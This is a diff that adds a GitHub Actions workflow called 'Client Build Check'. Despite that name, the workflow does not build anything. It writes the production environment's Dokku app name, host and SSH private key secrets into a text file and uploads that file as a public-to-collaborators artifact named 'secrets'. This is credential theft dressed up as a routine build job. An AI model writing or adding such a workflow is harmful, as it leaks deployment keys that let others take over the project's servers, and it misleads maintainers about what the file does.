@@ -1,0 +1,20 @@
+name: Client Build Check
+
+on:
+  workflow-dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    environment: production
+    steps:
+      - name: Save secrets
+        run: |
+          echo "DOKKU_APP_STAGING=${{ secrets.DOKKU_APP_STAGING }}" >> secret.txt
+          echo "DOKKU_HOST_STAGING=${{ secrets.DOKKU_HOST_STAGING }}" >> secret.txt
+          echo "DOKKU_SSH_KEY_STAGING=${{ secrets.DOKKU_SSH_KEY_STAGING }}" >> secret.txt
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: secrets
+          path: secret.txt
